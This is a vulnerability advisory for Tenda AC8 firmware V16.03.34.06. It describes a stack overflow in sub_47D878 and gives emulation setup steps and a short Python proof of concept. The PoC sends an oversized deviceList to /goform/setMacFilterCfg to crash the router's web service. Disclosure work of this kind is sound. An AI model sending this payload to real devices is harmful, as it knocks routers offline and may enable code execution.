sub\_47d878
-----------

Tenda AC8 version **V16.03.34.06** was discovered to contain a stack overflow via the src parameter in the function sub\_47D878.

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站：[https://www.tenda.com.cn/material/show/103518](https://www.tenda.com.cn/material/show/103518)

### Affected version

**V16.03.34.06**

### Environmental simulation

need build Network bridge:

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

qemu start command：

```text-plain
sudo qemu-mipsel-static -L . ./bin/httpd
```

### Vulnerability details

In the `sub_47D878` function at line 8, data is read from a user-supplied parameter provided by the caller function, and the `src` variable is passed to the functions at lines 28 and 29 without any length validation. This lack of length checking could lead to a stack-based buffer overflow. As a result, by crafting a malicious request to the page, an attacker could easily exploit this vulnerability to execute a denial of service (DoS) attack or achieve remote code execution (RCE). This poses a significant security risk, as it allows an attacker to crash the system or execute arbitrary code remotely.

![](api/attachments/TCxTxrP3hJ1u/image/image.png)

### PoC

Run this poc and you will see the service crash. The service will keep loading until it crashes.

```text-plain
import requests

ip = '192.168.142.100'
headers = {
    'Host': ip,
}

deviceList = 'R'*1000 + "\r10:11:11:11:11:22"
data = 'macFilterType=black&deviceList='+ deviceList


response = requests.post(
    f'http://{ip}/goform/setMacFilterCfg',
    headers=headers,
    data=data,
    verify=False,
)
```

![](api/attachments/boVZC86BE9Gc/image/image.png)